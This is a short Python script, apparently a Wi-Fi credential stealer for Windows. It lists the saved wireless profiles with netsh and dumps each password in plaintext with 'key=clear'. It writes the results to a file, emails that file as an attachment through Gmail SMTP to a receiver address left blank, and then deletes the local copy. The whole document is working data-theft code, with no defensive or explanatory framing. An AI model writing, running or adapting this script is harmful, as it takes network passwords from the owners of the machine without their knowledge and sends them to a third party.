import subprocess, smtplib , re
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
sender_email = ""
receiver_email = ""
passwordl=""
message = MIMEMultipart()

message["From"] = sender_email
message['To'] = receiver_email
message['Subject'] = "passwifi"


command1= "netsh wlan show profile"
networks = subprocess.check_output(command1,shell=True)
networks=str(networks)
network_list=[]


network_l =str(re.findall('(?:Profile\s*:\s)(.*)',networks))
network1=network_l.split("\\r")[0]
network1=network1.split('\\')[0]
network1=network1.replace("[","")
network1=network1.replace('"',"")
network_list.append(network1)
print(network1)
network_l =str(re.findall('(?:Profile\s*:\s)(.*)',network_l))
network1=network_l.split("\\r")[0]
network1=network1.split('\\')[0]
network1=network1.replace("[","")
network1=network1.replace("'","")
network_list.append(network1)
print(network1)
network_l =str(re.findall('(?:Profile\s*:\s)(.*)',network_l))
network1=network_l.split("\\r")[0]
network1=network1.split('\\')[0]
network1=network1.replace("[","")
network1=network1.replace("'","")
network_list.append(network1)
print(network1)
network_l =str(re.findall('(?:Profile\s*:\s)(.*)',network_l))
network1=network_l.split("\\r")[0]
network1=network1.split('\\')[0]
network1=network1.replace("[","")
network1=network1.replace("'","")
network_list.append(network1)

print(network1)


final=[]
one_network_result=""
for network in network_list:
	try:
		command2="netsh wlan show profile  "+ network +"  key=clear"
		one_network_result=str(subprocess.check_output(command2,shell=True))
		print(one_network_result)
	except:
		print("err\n")
	final.append(one_network_result)
print(final)
f = open("myfile.txt", "x")
f.write(str(final))
f.close()
file = "myfile.txt"
attachment = open(file,'rb')
obj = MIMEBase('application','octet-stream')
obj.set_payload((attachment).read())
encoders.encode_base64(obj)
obj.add_header('Content-Disposition',"attachment; filename= "+file)
message.attach(obj)
my_message = message.as_string()
email_session = smtplib.SMTP('smtp.gmail.com',587)
email_session.starttls()
email_session.login(sender_email,passwordl)
email_session.sendmail(sender_email,receiver_email,my_message)
email_session.quit()
print("YOUR MAIL HAS BEEN SENT SUCCESSFULLY")



os.remove("myfile.txt")



